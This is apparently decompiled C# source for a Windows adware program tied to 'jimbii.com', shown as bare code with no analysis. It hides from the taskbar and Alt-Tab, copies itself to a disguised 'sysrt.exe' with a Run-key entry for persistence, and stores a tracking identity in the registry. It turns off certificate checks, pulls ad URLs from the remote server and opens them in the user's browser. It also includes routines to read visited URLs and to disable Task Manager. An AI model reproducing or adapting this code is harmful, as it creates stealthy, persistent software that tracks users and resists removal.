using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using SHDocVw;
using jimbii;

namespace heaven;

public class Form1 : Form
{
	private IContainer components;

	private NotifyIcon notifyIcon1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem Restore;

	private ToolStripMenuItem pauseToolStripMenuItem;

	private ToolStripMenuItem Exit;

	private ToolStripMenuItem resumeToolStripMenuItem;

	private PictureBox pictureBox1;

	private ToolStripMenuItem gamesToolStripMenuItem;

	private static Timer myTimer = new Timer();

	private static int alarmCounter = 1;

	private static string browser = "";

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	public static string or_set_identity
	{
		get
		{
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Jimbii\\Preferences");
			string text = (string)registryKey.GetValue("identity");
			if (text == null || text == "")
			{
				text = GetUniqueKey(32);
				registryKey.SetValue("identity", text);
			}
			registryKey.Close();
			return text;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bf: Expected O, but got Unknown
		components = new Container();
		new ComponentResourceManager(typeof(Form1));
		notifyIcon1 = new NotifyIcon(components);
		contextMenuStrip1 = new ContextMenuStrip(components);
		gamesToolStripMenuItem = new ToolStripMenuItem();
		Restore = new ToolStripMenuItem();
		pauseToolStripMenuItem = new ToolStripMenuItem();
		resumeToolStripMenuItem = new ToolStripMenuItem();
		Exit = new ToolStripMenuItem();
		pictureBox1 = new PictureBox();
		((Control)contextMenuStrip1).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((ToolStripItem)gamesToolStripMenuItem).set_Name("gamesToolStripMenuItem");
		((ToolStripItem)gamesToolStripMenuItem).set_Size(new Size(123, 22));
		((ToolStripItem)gamesToolStripMenuItem).set_Text("Games");
		((ToolStripItem)Restore).set_Name("Restore");
		((ToolStripItem)Restore).set_Size(new Size(123, 22));
		((ToolStripItem)Restore).set_Text("Restore");
		((ToolStripItem)Exit).set_Name("Exit");
		((ToolStripItem)Exit).set_Size(new Size(123, 22));
		((ToolStripItem)Exit).set_Text("Exit");
		((ToolStripItem)Exit).add_Click((EventHandler)Exit_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 266));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("syse");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Control)this).add_Resize((EventHandler)Form1_Resize);
		((Control)contextMenuStrip1).ResumeLayout(false);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[DllImport("shell32.dll")]
	private static extern int SHGetFolderPath(IntPtr hwndOwner, int nFolder, IntPtr hToken, uint dwFlags, [Out] StringBuilder pszPath);

	public static string GetLocalAppDataFolder()
	{
		StringBuilder stringBuilder = new StringBuilder();
		SHGetFolderPath(IntPtr.Zero, 28, IntPtr.Zero, 0u, stringBuilder);
		return stringBuilder.ToString();
	}

	private static void TimerEventProcessor(object sender, EventArgs e)
	{
		myTimer.Stop();
		alarmCounter++;
		myTimer.set_Enabled(true);
		if (!is_poppable())
		{
			return;
		}
		try
		{
			browser = checkBrowsers();
			if (browser != "")
			{
				popWindow();
				inc_pop_count();
			}
		}
		catch (Exception)
		{
		}
	}

	public Form1()
	{
		InitializeComponent();
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).set_ShowInTaskbar(false);
		hide_from_alt_tab();
		installme();
		check_for_updates();
		_ = or_set_identity;
		myTimer.add_Tick((EventHandler)TimerEventProcessor);
		myTimer.set_Interval(1200000);
		myTimer.Start();
	}

	private void hide_from_alt_tab()
	{
		((Form)this).set_FormBorderStyle((FormBorderStyle)6);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_ShowInTaskbar(false);
	}

	private void check_for_updates()
	{
		string version = "";
		Version version2 = null;
		string requestUriString = "http://jimbii.com/version";
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		try
		{
			using Stream stream = httpWebResponse.GetResponseStream();
			using StreamReader streamReader = new StreamReader(stream, Encoding.UTF8);
			version = streamReader.ReadToEnd();
		}
		catch (Exception)
		{
		}
		version2 = new Version(version);
		Version version3 = Assembly.GetExecutingAssembly().GetName().Version;
		version3.CompareTo(version2);
	}

	public static WebClient prep_client()
	{
		WebClient webClient = new WebClient();
		webClient.Headers.Add("user-agent", user_agent());
		webClient.Headers.Add("SOFTWARE_CLIENT", "jimbii-lite v0.2");
		webClient.Headers.Add("IDENTITY", or_set_identity);
		return webClient;
	}

	private void send_error_to_server(string err)
	{
		WebClient webClient = prep_client();
		ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback(bypassAllCertificateStuff));
		Stream stream = webClient.OpenRead("https://jimbii.com/errors/log?body=" + err);
		StreamReader streamReader = new StreamReader(stream);
		streamReader.ReadToEnd();
		stream.Close();
		streamReader.Close();
	}

	public static void inc_pop_count()
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Jimbii\\Preferences");
		string text = (registryKey.GetValue("count") ?? "")!.ToString();
		text = ((text == null || text == "") ? "1" : (int.Parse(text) + 1).ToString());
		registryKey.SetValue("count", text);
	}

	public static bool is_poppable()
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Jimbii\\Preferences");
		string text = (registryKey.GetValue("date") ?? "")!.ToString();
		string text2 = (registryKey.GetValue("count") ?? "")!.ToString();
		if (text == DateTime.Today.ToString() && text2 == "4")
		{
			return false;
		}
		if (text != DateTime.Today.ToString())
		{
			registryKey.SetValue("count", 0);
			registryKey.SetValue("date", DateTime.Today);
			return true;
		}
		return true;
	}

	public static string GetUniqueKey(int length)
	{
		string text = string.Empty;
		while (text.Length < length)
		{
			text += Guid.NewGuid().ToString().GetHashCode()
				.ToString("x");
		}
		if (length <= 0 || length > text.Length)
		{
			throw new ArgumentException("Length must be between 1 and " + text.Length);
		}
		return text.Substring(0, length);
	}

	private void hide_from_system()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1);
		registryKey.Close();
	}

	private static void check_task_man()
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.MainWindowHandle != IntPtr.Zero)
			{
				MessageBox.Show(process.ProcessName);
			}
		}
	}

	private static void installme()
	{
		string text = GetLocalAppDataFolder() + "\\sysrt.exe";
		string sourceFileName = Application.get_ExecutablePath().ToString();
		if (!File.Exists(text))
		{
			File.Copy(sourceFileName, text);
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("sysrt", text);
		registryKey.Close();
	}

	private static string checkBrowsers()
	{
		string[] array = new string[4] { "firefox", "iexplore", "Safari", "chrome" };
		string result = "";
		Process[] processes = Process.GetProcesses();
		Process[] array2 = processes;
		foreach (Process process in array2)
		{
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (process.ProcessName == text)
				{
					result = text;
				}
			}
		}
		return result;
	}

	private static string currentIEurl()
	{
		string result = "";
		string text = "";
		ShellWindows shellWindows = new ShellWindowsClass();
		foreach (InternetExplorer item in shellWindows)
		{
			text = Path.GetFileNameWithoutExtension(item.FullName)!.ToLower();
			if (text.Equals("iexplore"))
			{
				result = item.LocationURL;
			}
		}
		return result;
	}

	private static bool bypassAllCertificateStuff(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
	{
		return true;
	}

	public static string user_agent()
	{
		string text = "";
		return browser switch
		{
			"chrome" => "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)", 
			"Safari" => "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)", 
			"iexplore" => "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)", 
			"firefox" => "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)", 
			_ => "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)", 
		};
	}

	public static string last_url()
	{
		string text = "";
		return browser switch
		{
			"chrome" => Encode64(currentIEurl()), 
			"Safari" => Encode64(currentIEurl()), 
			"iexplore" => Encode64(currentIEurl()), 
			"firefox" => Encode64(FirefoxUrl.getLastVisited()), 
			_ => Encode64(currentIEurl()), 
		};
	}

	private static void popWindow()
	{
		string text = "";
		string text2 = "";
		WebClient webClient = prep_client();
		ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback(bypassAllCertificateStuff));
		Stream stream = webClient.OpenRead("https://jimbii.com/ads/cpv?uri=" + text2);
		StreamReader streamReader = new StreamReader(stream);
		text = streamReader.ReadToEnd();
		stream.Close();
		streamReader.Close();
		Process.Start(browser + ".exe", text);
	}

	private static string Encode64(string str)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(str);
		return Convert.ToBase64String(bytes);
	}

	private static string Decode64(string str)
	{
		byte[] bytes = Convert.FromBase64String(str);
		return Encoding.UTF8.GetString(bytes);
	}

	private void Form1_Resize(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}

	private void Exit_Click(object sender, EventArgs e)
	{
		close_helper();
		Environment.Exit(0);
	}

	private void close_helper()
	{
		notifyIcon1.set_Visible(false);
		myTimer.Stop();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		close_helper();
		Environment.Exit(0);
	}
}
